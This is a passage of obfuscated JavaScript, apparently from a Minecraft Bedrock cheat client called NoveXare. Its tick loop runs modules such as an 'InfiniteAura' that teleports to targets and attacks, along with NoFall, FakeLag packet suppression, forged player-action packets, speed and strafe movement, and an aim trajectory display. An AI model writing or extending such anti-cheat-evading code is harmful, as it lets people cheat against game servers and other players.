              InfiniteAura_backPos = backMotion = InfiniteAura_backMotion = null;
            }
          }
          if (tick > -InfiniteAura_delay) {
            tick--;
          }
        } else if (func_mode.server_mode === 1) {
          if (tick === 0) {
            const _0x5c2fa5 = InfiniteAura_random ? getRandomNum(-2, 2) : 0;
            InfiniteAura_backPos = self_pos;
            InfiniteAura_backMotion = _0x16a344;
            for (let _0x38c8a9 = 0; _0x38c8a9 < InfiniteAura_move; _0x38c8a9++) {
              if (func_mode.InfiniteAura_mode === 0) {
                setPos(_0x2381d7.x, _0x2381d7.y, _0x2381d7.z);
              }
              if (func_mode.InfiniteAura_mode === 1) {
                Teleport(_0x2381d7.x, _0x2381d7.y, _0x2381d7.z);
              }
              if (func_mode.InfiniteAura_mode === 4) {
                sendPlayerAuthInput({
                  inputMode: 2,
                  playMode: 0,
                  pos: {
                    x: _0x2381d7.x + _0x5c2fa5,
                    y: _0x2381d7.y + InfiniteAura_yoffset / 5,
                    z: _0x2381d7.z + _0x5c2fa5
                  },
                  motion: getEntityMotion(self_id),
                  rot: {
                    pitch: 0,
                    yaw: 0
                  },
                  yHeadRot: 0,
                  inputs: [1]
                });
              }
              if (InfiniteAura_click) {
                buildBlock(self_id, _0x2381d7.x + _0x5c2fa5, _0x2381d7.y, _0x2381d7.z + _0x5c2fa5, 1);
                sendPlayerAuthInput({
                  inputMode: 2,
                  playMode: 0,
                  pos: {
                    x: _0x2381d7.x + _0x5c2fa5,
                    y: _0x2381d7.y + InfiniteAura_yoffset / 5,
                    z: _0x2381d7.z + _0x5c2fa5
                  },
                  actions: [{
                    pos: {
                      x: _0x2381d7.x + _0x5c2fa5,
                      y: _0x2381d7.y + InfiniteAura_yoffset / 5,
                      z: _0x2381d7.z + _0x5c2fa5
                    },
                    value: 1,
                    type: 25
                  }],
                  inputs: [1]
                });
              }
            }
            if (InfiniteAura_backY) {
              setPos(InfiniteAura_backPos.x, InfiniteAura_backPos.y + (InfiniteAura_backY ? 1.5 : 0), InfiniteAura_backPos.z);
            }
            if (InfiniteAura_amove) {
              setMotion(0, 0.42, 0);
            }
            for (let _0x3b4664 = 0; _0x3b4664 < InfiniteAura_num; _0x3b4664++) {
              attack(_0x227e89, AttackSwing);
            }
          }
          if (tick <= -InfiniteAura_delay) {
            setMotion(InfiniteAura_backMotion.x, InfiniteAura_backMotion.y, InfiniteAura_backMotion.z);
            if (InfiniteAura_back) {
              for (let _0x4d7205 = 0; _0x4d7205 < InfiniteAura_move; _0x4d7205++) {
                var _0x2d2f81 = {
                  x: InfiniteAura_backPos.x,
                  y: InfiniteAura_backPos.y,
                  z: InfiniteAura_backPos.z
                };
                sendPlayerAuthInput({
                  inputMode: 2,
                  playMode: 0,
                  pos: _0x2d2f81,
                  motion: getEntityMotion(self_id),
                  rot: {
                    pitch: 0,
                    yaw: 0
                  },
                  yHeadRot: 0,
                  inputs: [1]
                });
              }
            }
            if (InfiniteAura_backclick) {
              buildBlock(self_id, InfiniteAura_backPos.x, InfiniteAura_backPos.y, InfiniteAura_backPos.z, 0);
              var _0x57250a = {
                x: InfiniteAura_backPos.x,
                y: InfiniteAura_backPos.y,
                z: InfiniteAura_backPos.z
              };
              var _0x13f070 = {
                x: InfiniteAura_backPos.x,
                y: InfiniteAura_backPos.y,
                z: InfiniteAura_backPos.z
              };
              var _0x414b50 = {
                pos: _0x13f070,
                value: 1,
                type: 25
              };
              var _0x1d1e39 = {
                pos: _0x57250a,
                actions: [_0x414b50]
              };
              sendPlayerAction(_0x1d1e39);
            }
            tick = InfiniteAura_tick;
          }
          if (tick > -InfiniteAura_delay) {
            tick--;
          }
        }
      });
      if (FuncTip && !ShortList) {
        _0x2aa3e0.push("§rAttack §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + obj2str(InfiniteAura_target.map(_0x3214b1 => getEntityName(_0x3214b1))));
      }
      if (FuncTip && ShortList) {
        _0x2aa3e0.push("§rAttack §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + InfiniteAura_target.map(_0x24833b => getEntityName(_0x24833b)).length);
      }
    }
    if (ClickDestroy && AutoDestroy) {
      ModuleDestroy(self_pos);
    }
    if (AutoVoid) {
      const _0x1f000f = getPlayerBlockPos(self_id);
      const _0x46fd44 = getBlock(_0x1f000f.x, _0x423186.y - 1, _0x1f000f.z);
      for (let _0x5b3731 = -2; _0x5b3731 < 3; _0x5b3731++) {
        for (let _0x586493 = -2; _0x586493 < 3; _0x586493++) {
          const _0x400ca7 = getBlock(_0x1f000f.x + _0x5b3731, _0x423186.y - 1, _0x1f000f.z + _0x586493);
          if (_0x400ca7.namespace == "minecraft:air" && _0x16a344.y < -0.0783 && _0x16a344.y > -0.0785 && _0x46fd44.namespace != "minecraft:air") {
            var _0x5c2724 = {
              x: _0x1f000f.x + _0x5b3731,
              y: self_pos.y,
              z: _0x1f000f.z - _0x586493
            };
            const _0x5edd74 = getPlayerAngle(self_id, _0x5c2724, "yaw_pos");
            var _0x29cab6 = {
              yaw: _0x5edd74,
              pitch: 0
            };
            const _0x4e4148 = getDisplacement(-0.5, self_pos, _0x29cab6);
            setMotion(_0x4e4148.x - self_pos.x, _0x16a344.y, _0x4e4148.z - self_pos.z);
          }
        }
      }
    }
    if (avoid_throw) {
      const _0x293495 = getEntityList();
      _0x293495.map(_0x4a93c7 => {
        if ((getEntityTypeId(_0x4a93c7) == 4194389 || getEntityTypeId(_0x4a93c7) == 4194390 || getEntityTypeId(_0x4a93c7) == 12582992) && getDistanceByID(_0x4a93c7, self_id) <= avoid_distance) {
          if (avoid_remove) {
            removeEntity(_0x4a93c7);
          }
          if (func_mode.avoid_mode == 0) {
            const _0xbe903d = getPlayerBlockPos(self_id);
            for (let _0x12f49f = -2; _0x12f49f < 3; _0x12f49f++) {
              for (let _0x212ca5 = -2; _0x212ca5 < 3; _0x212ca5++) {
                const _0x75c8f1 = getBlock(_0xbe903d.x + _0x12f49f, _0x423186.y - 1, _0xbe903d.z + _0x212ca5);
                if (_0x75c8f1.namespace != "minecraft:air") {
                  var _0x4a5cb5 = {
                    x: _0xbe903d.x + _0x12f49f,
                    y: self_pos.y,
                    z: _0xbe903d.z - _0x212ca5
                  };
                  const _0x22c566 = getPlayerAngle(self_id, _0x4a5cb5, "yaw_pos");
                  var _0x2c90a6 = {
                    yaw: _0x22c566,
                    pitch: 0
                  };
                  const _0x54e7ab = getDisplacement(0.3, self_pos, _0x2c90a6);
                  setMotion(_0x54e7ab.x - self_pos.x, _0x16a344.y, _0x54e7ab.z - self_pos.z);
                }
              }
            }
          }
          if (func_mode.avoid_mode == 1) {
            attack(_0x4a93c7, AttackSwing);
          }
          if (func_mode.avoid_mode == 2) {
            setPos(10000, 100000, 10000);
          }
        }
      });
    }
    if (TrajectoryRender) {
      const _0x28a78c = getPlayerList();
      let _0x425ce1 = [];
      let _0x2acfb6 = false;
      let _0x123698 = {
        x: 0,
        y: 0,
        z: 0
      };
      for (let _0x45271b = 1; _0x45271b <= throwable_particle_length; _0x45271b += throwable_particle_density / 10) {
        let _0x5acf22 = getParabola(_0x45271b, _0x412945.pitch, throwable_particle_speed, throwable_particle_gravity).data;
        var _0x373e41 = {
          yaw: _0x412945.yaw,
          pitch: 0
        };
        let _0x24a3b7 = getDisplacement(_0x45271b, self_pos, _0x373e41);
        let _0x1e1028 = getBlock(_0x24a3b7.x, _0x24a3b7.y + _0x5acf22, _0x24a3b7.z);
        if (throwable_particle_target || !_0x2acfb6) {
          _0x28a78c.map(_0x10d491 => {
            if (!_0x2acfb6) {
              let _0x21d2e2 = getEntityPos(_0x10d491);
              var _0x2e8f04 = {
                x: _0x24a3b7.x,
                y: _0x24a3b7.y + _0x5acf22,
                z: _0x24a3b7.z
              };
              let _0x46867e = _0x2e8f04;
              let _0x341d4d = getEntitySize(_0x10d491);
              if (_0x46867e.x <= _0x21d2e2.x + _0x341d4d.x / 2 && _0x46867e.x >= _0x21d2e2.x - _0x341d4d.x / 2 && _0x46867e.y <= _0x21d2e2.y + _0x341d4d.y / 2 && _0x46867e.y >= _0x21d2e2.y - _0x341d4d.y / 2 && _0x46867e.z <= _0x21d2e2.z + _0x341d4d.x / 2 && _0x46867e.z >= _0x21d2e2.z - _0x341d4d.x / 2) {
                _0x2aa3e0.push("§rHasAimed §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + getEntityName(_0x10d491));
                _0x2acfb6 = true;
              }
            }
          });
        }
        if (_0x1e1028.namespace != "minecraft:air" || _0x2acfb6) {
          _0x123698 = _0x24a3b7;
          if (func_mode.throwable_particle_mode == 1 && _0x1e1028.namespace != "minecraft:air") {
            for (let _0x365b15 = 0; _0x365b15 <= 20; _0x365b15 += 2) {
              drawParticle(throwable_particle_type, _0x123698.x, _0x123698.y + _0x5acf22 + _0x365b15 / 10, _0x123698.z, 1);
            }
          }
          break;
        }
      }
      if (func_mode.throwable_particle_mode == 0) {
        let _0xc8f1e2 = getDistance(_0x123698, self_pos);
        for (let _0x13077c = 1; _0x13077c <= _0xc8f1e2; _0x13077c += throwable_particle_density / 10) {
          let _0x36490f = getParabola(_0x13077c, _0x412945.pitch, throwable_particle_speed, throwable_particle_gravity).data;
          let _0x4cfecb = func_mode.throwable_particle_mode == 0 ? (throwable_particle_offset - 10) / 10 : 0;
          let _0x1689b5 = _0x412945.yaw + 90;
          if (_0x1689b5 > 180) {
            _0x1689b5 = _0x1689b5 - 360;
          }
          if (_0x1689b5 < -180) {
            _0x1689b5 = _0x1689b5 + 360;
          }
          var _0x39d1d4 = {
            yaw: _0x1689b5,
            pitch: 0
          };
          let _0x419b8a = getDisplacement(_0x4cfecb, self_pos, _0x39d1d4);
          let _0x7e5dd1 = getDisplacement(_0x13077c, _0x419b8a, {
            yaw: _0x412945.yaw - Math.atan(_0x4cfecb / _0xc8f1e2) * (180 / Math.PI),
            pitch: 0
          });
          let _0x29e1b6 = getBlock(_0x7e5dd1.x, _0x7e5dd1.y + _0x36490f, _0x7e5dd1.z);
          if (func_mode.throwable_particle_mode == 0 && _0x29e1b6.namespace == "minecraft:air") {
            drawParticle(throwable_particle_type, _0x7e5dd1.x, _0x7e5dd1.y + _0x36490f, _0x7e5dd1.z, 1);
          }
        }
      }
    }
    if (FarmAura) {
      const _0x2f240b = getPlayerBlockPos(self_id);
      for (let _0x1a8f07 = -4; _0x1a8f07 < 5; _0x1a8f07++) {
        for (let _0x506340 = -4; _0x506340 < 5; _0x506340++) {
          const _0x10a9d0 = getBlock(_0x2f240b.x + _0x1a8f07, _0x423186.y - 1, _0x2f240b.z + _0x506340);
          const _0x158d01 = getBlock(_0x2f240b.x + _0x1a8f07, _0x423186.y, _0x2f240b.z + _0x506340);
          if ((_0x10a9d0.namespace == "minecraft:dirt" || _0x10a9d0.namespace == "minecraft:grass") && _0x4f7660.namespace.includes("hoe")) {
            buildBlock(self_id, _0x2f240b.x + _0x1a8f07, _0x423186.y - 1, _0x2f240b.z + _0x506340, 1);
          }
          if (_0x10a9d0.namespace == "minecraft:farmland" && (_0x4f7660.namespace == "minecraft:beetroot_seeds" || _0x4f7660.namespace == "minecraft:wheat_seeds" || _0x4f7660.namespace == "minecraft:carrot" || _0x4f7660.namespace == "minecraft:potato")) {
            buildBlock(self_id, _0x2f240b.x + _0x1a8f07, _0x423186.y - 1, _0x2f240b.z + _0x506340, 1);
          }
          if (_0x158d01.aux == 7 && (_0x158d01.namespace == "minecraft:beetroot" || _0x158d01.namespace == "minecraft:wheat" || _0x158d01.namespace == "minecraft:carrots" || _0x158d01.namespace == "minecraft:potatoes")) {
            destroyBlock(self_id, _0x2f240b.x + _0x1a8f07, _0x423186.y, _0x2f240b.z + _0x506340, 1);
          }
          if (_0x4f7660.namespace == "minecraft:bone_meal" && _0x158d01.aux <= 6 && (_0x158d01.namespace == "minecraft:beetroot" || _0x158d01.namespace == "minecraft:wheat" || _0x158d01.namespace == "minecraft:carrots" || _0x158d01.namespace == "minecraft:potatoes")) {
            buildBlock(self_id, _0x2f240b.x + _0x1a8f07, _0x423186.y, _0x2f240b.z + _0x506340, 1);
          }
        }
      }
    }
    if (ChargeAura) {
      const _0x99c8b5 = getPlayerBlockPos(self_id);
      for (let _0x23a6b5 = -4; _0x23a6b5 < 5; _0x23a6b5++) {
        for (let _0x5a4433 = -3; _0x5a4433 < 4; _0x5a4433++) {
          for (let _0x5f42c7 = -4; _0x5f42c7 < 5; _0x5f42c7++) {
            const _0x3323d1 = getBlock(_0x99c8b5.x + _0x23a6b5, _0x99c8b5.y + _0x5a4433, _0x99c8b5.z + _0x5f42c7);
            if (_0x3323d1.namespace == "minecraft:respawn_anchor" && _0x3323d1.aux == 0) {
              selectPlayerInventorySlot(self_id, getItem(self_id, "glowstone"));
              buildBlock(self_id, _0x99c8b5.x + _0x23a6b5, _0x99c8b5.y + _0x5a4433, _0x99c8b5.z + _0x5f42c7, 0);
            }
          }
        }
      }
    }
    if (ActionManager) {
      if (!use_action_config) {
        if (action_tick > action_ticks) {
          for (let _0x5cfa70 = 0; _0x5cfa70 < action_times; _0x5cfa70++) {
            sendPlayerAction({
              id: self_id,
              pos: self_pos,
              value: 1,
              type: Number(edit_action_id)
            });
          }
        }
      } else {
        const _0x5e6558 = JSON.parse(readFile(NoveXare_path + "/PlayerAction.json"));
        _0x5e6558.map(_0x3cda1d => {
          if (_0x3cda1d.delay % action_tick == 0) {
            for (let _0x32faa3 = 0; _0x32faa3 < _0x3cda1d.count; _0x32faa3++) {
              sendPlayerAction({
                id: self_id,
                pos: self_pos,
                value: _0x3cda1d.value,
                type: Number(_0x3cda1d.id)
              });
            }
          }
        });
      }
    }
    if (isDestroy && (destroy_list.length == 0 || current_mine_num >= mine_num)) {
      isDestroy = false;
      destroy_namespace = null;
      destroy_list = [];
      current_mine_num = 0;
    }
    if (auto_jump) {
      if (_0x58cd3a && _0x16a344.y > -0.0785 && _0x16a344.y < -0.0783) {
        setMotion(_0x16a344.x, jump_strength / 100, _0x16a344.z);
      }
    }
    if (BlockClicker && !block_ac_select && ac_pos.length > 0) {
      ac_pos.map(_0x52c7c8 => buildBlock(self_id, _0x52c7c8.x, _0x52c7c8.y, _0x52c7c8.z, 0));
    }
    if (_0x16a344.y < -0.6 && NoFall && !_0x58cd3a) {
      if (func_mode.nofall_mode === 0) {
        setMotion(0, 0, 0);
      }
      if (func_mode.nofall_mode === 1) {
        callModule(37, "{\"value\":true}");
        setTimeout(() => callModule(37, "{\"value\":false}"), 500);
      }
      if (func_mode.nofall_mode === 2) {
        callModule(30, "{\"value\":true,\"speed\":0}");
        setTimeout(() => callModule(30, "{\"value\":false}"), 500);
      }
      var _0x334459 = {
        id: self_id,
        pos: self_pos,
        value: 1,
        type: 7
      };
      if (func_mode.nofall_mode === 3) {
        sendPlayerAction(_0x334459);
      }
    }
    if (FakeLag) {
      if (lag_t >= lag_tick + lag_last_tick) {
        if (func_mode.FakeLag_mode == 0) {
          callModule(37, "{\"value\":" + b2s(!reverse_lag) + "}");
        }
        if (func_mode.FakeLag_mode == 1) {
          callModule(7, "{\"packet\":\"send\",\"enable\":" + b2s(reverse_lag) + ",\"index\":19}");
        }
        if (func_mode.FakeLag_mode == 2) {
          callModule(7, "{\"packet\":\"receive\",\"enable\":" + b2s(!reverse_lag) + ",\"index\":19}");
        }
        lag_t = 0;
      }
      if (lag_t >= lag_tick) {
        if (func_mode.FakeLag_mode == 0) {
          callModule(37, "{\"value\":" + b2s(reverse_lag) + "}");
        }
        if (func_mode.FakeLag_mode == 1) {
          callModule(7, "{\"packet\":\"send\",\"enable\":" + b2s(!reverse_lag) + ",\"index\":19}");
        }
        if (func_mode.FakeLag_mode == 2) {
          callModule(7, "{\"packet\":\"receive\",\"enable\":" + b2s(!reverse_lag) + ",\"index\":19}");
        }
      }
      if (fakelag_status) {
        _0x2aa3e0.push("§rFakeLagStatus §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + ("停止发包: " + reverse_lag + ", 停止发送移动包" + !reverse_lag + ", 停止接受移动包 " + !reverse_lag));
      }
    }
    if (build_list.length > 0 && build_t > build_tick && !build_success) {
      const _0x35edca = build_list.shift();
      buildBlock(self_id, Math.round(_0x35edca.x), Math.round(_0x35edca.y - 1), Math.round(_0x35edca.z), 0);
      build_t = 0;
      if (build_list.length == 0) {
        build_success = true;
      }
    }
    if (TargetHealth && target_list.length > 0) {
      _0x2aa3e0.push("§rInfo §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + ("Health: " + getHealth(target_list[0], func_mode.health_mode)));
    }
    if (target_list.length > 0 && ShowTargetList) {
      _0x2aa3e0.push("§rTargets §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "" + obj2str(target_list.map(_0xb9f571 => getEntityName(_0xb9f571))));
    }
    if (ShowInfo) {
      const _0x4450ab = getEntityAttribute(self_id, "minecraft:movement");
      const _0x1cbda7 = Math.sqrt(_0x16a344.x * _0x16a344.x + _0x16a344.z * _0x16a344.z);
      if (show_speed) {
        _0x2aa3e0.push("§rInfo §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "水平移动速度: " + _0x1cbda7.toFixed(2) + "m/s 移动速度: " + _0x351e65.toFixed(2) + "m/s\n水平坐标速度: " + _0x162843.toFixed(2) + "m/s 坐标速度:" + _0x323bde.toFixed(2) + "m/s 能力速度:" + _0x4450ab.current.toFixed(2) + ("\n移动值: [" + _0x16a344.x.toFixed(2) + ", " + _0x16a344.y.toFixed(2) + ", " + _0x16a344.z.toFixed(2) + "]"));
      }
      if (show_pos) {
        _0x2aa3e0.push("§rInfo §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "坐标: " + ("[X:" + _0x423186.x + ", Y:" + _0x423186.y + ", Z:" + _0x423186.z + "]"));
      }
      if (show_item && _0x4f7660.count > 0) {
        _0x2aa3e0.push("§rInfo §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + (_0x4f7660.name + " §r§ox" + getItemCount(-1)));
      }
      if (show_target_dis && target_list.length > 0) {
        _0x2aa3e0.push("§rInfo §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + ("距离: " + getDistanceByID(self_id, target_list[0]) + "m"));
      }
      if (show_player_list) {
        _0x2aa3e0.push("§rInfo §7>>> \" + (RainbowTip ? \"§\" + rgb_color[rgb_l] : \"§r\") + \"世界玩家: " + _0x5ed6d7.length + "人");
      }
      if (show_kill_num) {
        _0x2aa3e0.push("§rInfo §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + ("击杀: " + kills + "人"));
      }
      if (show_time) {
        _0x2aa3e0.push("§rInfo §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + ("Time: " + timeFormat(seconds) + ", Ticks: " + ticks));
      }
      if (show_attack_rate) {
        _0x2aa3e0.push("§rInfo §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + ("命中率: " + Math.round(real_attack / attack_frequency * 100) + "%%, 攻击总次数: " + attack_frequency + ", 空刀次数:" + (attack_frequency - real_attack) + ", 命中次数:" + real_attack));
      }
      if (show_real_cps) {
        _0x2aa3e0.push("§rInfo §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + ("预期CPS: " + Math.round(attack_frequency / attack_ticks * 20) + "/s, 实际CPS: " + Math.round(real_attack / attack_ticks * 20) + "/s"));
      }
      if (show_ping) {
        _0x2aa3e0.push("§rInfo §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + ("延迟: " + ping + "ms"));
      }
      if (show_self_health) {
        _0x2aa3e0.push("§rInfo §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + ("当前血量: " + _0x3ba0a3.current + ", 最大值:" + _0x3ba0a3.max + ", 最小值:" + _0x3ba0a3.min));
      }
      if (show_detail_item) {
        _0x2aa3e0.push("§rInfo §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + ("数据: " + JSON.stringify(_0x4f7660)));
      }
    }
    if (ModifyTime) {
      if (custom_time == 25) {
        var _0x392f41 = 0;
        if (func_mode.set_time == 0) {
          _0x392f41 = 1000;
        }
        if (func_mode.set_time == 1) {
          _0x392f41 = 13000;
        }
        if (func_mode.set_time == 2) {
          _0x392f41 = 6000;
        }
        if (func_mode.set_time == 3) {
          _0x392f41 = 12500;
        }
        var _0xca920a = {
          time: _0x392f41
        };
        setWorldData(_0xca920a);
      } else {
        setWorldData({
          time: custom_time * 1000
        });
      }
    }
    if (ModifySwing) {
      if (swing_speed > 17) {
        setEntityEffect(self_id, {
          id: 3,
          duration: 2,
          amplifier: swing_speed - 17,
          displayOnScreenTextureAnimation: false,
          noCounter: true,
          effectVisible: false
        });
      } else if (swing_speed < 17) {
        setEntityEffect(self_id, {
          id: 4,
          duration: 2,
          amplifier: 17 - swing_speed,
          displayOnScreenTextureAnimation: false,
          noCounter: true,
          effectVisible: false
        });
      }
    }
    var _0x3d0b55 = {
      id: 16,
      duration: 600,
      amplifier: 1,
      displayOnScreenTextureAnimation: false,
      noCounter: true,
      effectVisible: false
    };
    if (NightVision) {
      setEntityEffect(self_id, _0x3d0b55);
    }
    if (rocker_func.angle != undefined) {
      const _0x50d083 = getEntityRot();
      const _0x1ff75f = getEntityPos(self_id);
      const _0x19a0b3 = getEntityMotion(self_id);
      var _0x53ae87 = Math.round(_0x50d083.yaw);
      _0x53ae87 += rocker_func.angle < 90 ? rocker_func.angle + 90 : rocker_func.angle - 270;
      let _0x49776a = (_0x58cd3a ? 0.216 : 0.226) + (boostSpeed ? rocker_speed / 50 : 0);
      let _0xcd3ab0 = (_0x58cd3a ? 0.2805 : 0.293) + (boostSpeed ? rocker_speed / 50 : 0);
      if (_0x53ae87 >= 180) {
        _0x53ae87 -= 360;
      }
      if (_0x53ae87 <= -180) {
        _0x53ae87 += 360;
      }
      let _0xc3f6d9 = {};
      if (targetStrafe && target_list.length > 0 && getDistanceByID(self_id, target_list[0]) <= targetStrafe_distance * 2) {
        let _0x287a8c = getPlayerAngle(self_id, target_list[0], "yaw_pos");
        let _0x5dad6e = getPlayerAngle(self_id, target_list[0], "yaw_rot");
        let _0x18cba5 = _0x5dad6e > -90 || _0x5dad6e < 90 ? rocker_speed : -rocker_speed;
        let _0x4bcc80 = _0x53ae87 > -90 || _0x53ae87 < 90 ? rocker_speed : -rocker_speed;
        let _0x23d127 = targetStrafe_relative ? _0x18cba5 : _0x4bcc80;
        Angel = rocker_func.angle > 450 - targetStrafe_range && rocker_func.angle <= targetStrafe_range + 180 || rocker_func.angle > 180 - targetStrafe_range && rocker_func.angle <= targetStrafe_range - 90 ? _0x287a8c -= _0x23d127 * 5 : _0x287a8c += _0x23d127 * 5;
        if (_0x287a8c > 180) {
          _0x287a8c -= 360;
        }
        if (_0x287a8c < -180) {
          _0x287a8c += 360;
        }
        var _0x4b9426 = {
          yaw: _0x287a8c,
          pitch: 0
        };
        let _0x1a1414 = getDisplacement(targetStrafe_distance, getEntityPos(target_list[0]), _0x4b9426);
        let _0x4bbdfd = getPlayerAngle(_0x1a1414, self_id, "yaw_pos");
        var _0x170586 = {
          yaw: _0x4bbdfd,
          pitch: 0
        };
        _0xc3f6d9 = getDisplacement(imitateMove ? func_mode.move_mode == 0 ? _0x49776a : _0xcd3ab0 : rocker_speed / 8, _0x1ff75f, _0x170586);
      } else {
        _0xc3f6d9 = getDisplacement(imitateMove ? func_mode.move_mode == 0 ? _0x49776a : _0xcd3ab0 : rocker_speed / 8, _0x1ff75f, {
          yaw: _0x53ae87,
          pitch: 0
        });
      }
      Camera_anchor_pos = {
        x: Camera_anchor_pos.x + (_0xc3f6d9.x - _0x1ff75f.x),
        y: Camera_anchor_pos.y + (_0xc3f6d9.y - _0x1ff75f.y),
        z: Camera_anchor_pos.z + (_0xc3f6d9.z - _0x1ff75f.z)
      };
      if (func_mode.rocker_mode == 1) {
        setPos(_0xc3f6d9.x, _0x1ff75f.y, _0xc3f6d9.z);
      }
      if (func_mode.rocker_mode == 2) {
        setCameraAnchor(Camera_anchor_pos.x, 0, Camera_anchor_pos.z);
      }
      if (func_mode.rocker_mode == 0) {
        setMotion(_0xc3f6d9.x - _0x1ff75f.x, rocker_bhop && _0x58cd3a && _0x19a0b3.y.toFixed(4) == -0.0784 || rocker_ahop && _0x19a0b3.y < -0.4 ? rocker_bhop_heigh : _0x19a0b3.y, _0xc3f6d9.z - _0x1ff75f.z);
      }
      rocker_func = {};
    }
    if (airjump_func.operation != undefined) {
      const _0xbb8453 = getEntityPos(self_id);
      const _0x533342 = getEntityMotion(self_id);
      if (airjump_func.operation == "up") {
        Camera_anchor_pos.y += rocker_bhop_heigh;
        if (func_mode.rocker_mode == 1) {
          setPos(_0xbb8453.x, _0xbb8453.y + rocker_bhop_heigh, _0xbb8453.z);
        }
        if (func_mode.rocker_mode == 0) {
          setMotion(_0x533342.x, rocker_bhop_heigh, _0x533342.z);
        }
        if (func_mode.rocker_mode == 2) {
          setCameraAnchor(Camera_anchor_pos.x, Camera_anchor_pos.y, Camera_anchor_pos.z);
        }
      }
      if (airjump_func.operation == "down") {
        Camera_anchor_pos.y -= rocker_bhop_heigh;
        if (func_mode.rocker_mode == 1) {
          setPos(_0xbb8453.x, _0xbb8453.y - rocker_bhop_heigh, _0xbb8453.z);
        }
        if (func_mode.rocker_mode == 0) {
          setMotion(_0x533342.x, -rocker_bhop_heigh, _0x533342.z);
        }
        if (func_mode.rocker_mode == 2) {
          setCameraAnchor(Camera_anchor_pos.x, Camera_anchor_pos.y, Camera_anchor_pos.z);
        }
      }
      airjump_func = {};
    }
    if (BalanceTimer || BalanceTimer_st) {
      _0x2aa3e0.push("§rTimerTick §7>>> §r" + BalanceTimer_t + "tick");
      if (BalanceTimer_t <= 0 && BalanceTimer_st) {
        callModule(30, "{\"value\":false}");
        BalanceTimer_st = false;
      } else if (BalanceTimer_t > 0) {
        setPos(self_pos.x, self_pos.y, self_pos.z);
      }
    }
    if (!BalanceTimer && BalanceTimer_t > 0 && BalanceTimer_st) {
      BalanceTimer_t--;
    }
    if (FakeTip) {
      switch (func_mode.fakeTip_mode) {
        case 0:
          showTipMessage("§bProtoHax §r| " + _0x323bde.toFixed(2) + " §eBlocks/sec");
          break;
        case 1:
          if (tip_t1 > 200) {
            curl_get("https://v1.jinrishici.com/jieri/chunjie", {}, (_0x4b6f07, _0x13628c) => globalThis.current_poem = JSON.parse(_0x13628c).content);
            tip_t1 = 0;
          }
          showTipMessage("[§bCheat§ePlugin§r] " + current_poem);
          break;
        case 5:
          showTipMessage("Ping: " + ping + "ms Speed: " + _0x323bde.toFixed(2) + "B/S CPS: " + Math.round(real_attack / attack_ticks * 20));
          break;
      }
    }
    if (destroy_list.length > 0 && isDestroy) {
      for (let _0x461493 = 0; _0x461493 < 5; _0x461493++) {
        let _0x4c9f08 = destroy_list.shift();
        if (typeof _0x4c9f08 == "object" && _0x4c9f08.length > 0) {
          const _0xc4bd72 = getBlock(_0x4c9f08[0], _0x4c9f08[1], _0x4c9f08[2]);
          if (_0xc4bd72.namespace != "minecraft:air" && _0xc4bd72.namespace == destroy_namespace) {
            destroyBlock(self_id, _0x4c9f08[0], _0x4c9f08[1], _0x4c9f08[2], 0);
            if (FuncTip) {
              _0x2aa3e0.push("§r进度 §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + current_mine_num + "/" + mine_num);
            }
            current_mine_num++;
          }
        }
      }
    }
    if (_0x2aa3e0.length > 0 && !FakeTip) {
      showTipMessage("§3§l[NoveXare] §r§7>>> §r" + _0x2aa3e0.join(",\n"));
    }
    if (last_tick_id != self_id) {
      last_tick_id = self_id;
    }
    if (FakeLag) {
      lag_t++;
    }
    if (Cleaner) {
      drop_delay_t++;
    }
    if (GodMode) {
      gm_tick++;
    }
    if (FastBuild && build_list.length > 0) {
      build_t++;
    }
    if (rgb_t >= rgb_cycle) {
      rgb_l++;
      rgb_t = 0;
    }
    if (rgb_l >= rgb_color.length) {
      rgb_l = 0;
    }
    if (attack_tick > 20 && gradual_up) {
      attack_sound_level = 0;
    }
    if (isAttacking) {
      attack_ticks++;
      isAttacking = false;
    }
    attack_tick++;
    shift_tick_r++;
    if (HotbarSelector) {
      select_t++;
    }
    if (circulateSender) {
      rpc_t++;
    }
    if (InfiniteAura) {
      InfiniteAura_switch_delay_r++;
    }
    if (AutoArmor && !StartArmor) {
      armor_slot++;
    }
    if (FakeTip && func_mode.fakeTip_mode == 1) {
      tip_t1++;
    }
    if (select_t > select_delay) {
      select_slot++;
      select_t = 0;
    }
    if (select_slot > 8) {
      select_slot = 0;
    }
    if (armor_slot > 8) {
      armor_slot = 0;
    }
    if (target_list.length > 0 && InfiniteAura_list == 0 && InfiniteAura_switch_delay > 0) {
      InfiniteAura_list = target_list;
    }
    if (InfiniteAura_switch_delay_r > InfiniteAura_switch_delay && InfiniteAura_list.length > 0) {
      InfiniteAura_target[0] = InfiniteAura_list[0];
      InfiniteAura_list.shift();
      InfiniteAura_switch_delay_r = 0;
    }
    if (mini_kills > 0) {
      mini_tick++;
    }
    if (mini_tick > 100) {
      mini_kills = 0;
      mini_tick = 0;
    }
    if (BalanceTimer && !BalanceTimer_st) {
      BalanceTimer_t++;
    }
    calculate_t++;
    tickCounter++;
    action_tick++;
    rgb_t++;
    seconds = Math.floor(ticks / 20);
    ticks++;
    t_b++;
    t_c++;
    switch_delay_t++;
    derp_p_r -= random_rot ? getRandomNum(-10, 10) : head_rot_speed * 2;
    derp_y_r += random_rot ? getRandomNum(-10, 10) : body_rot_speed * 2;
    if (derp_p_r < -90) {
      derp_p_r = 90;
    }
    if (derp_y_r > 180) {
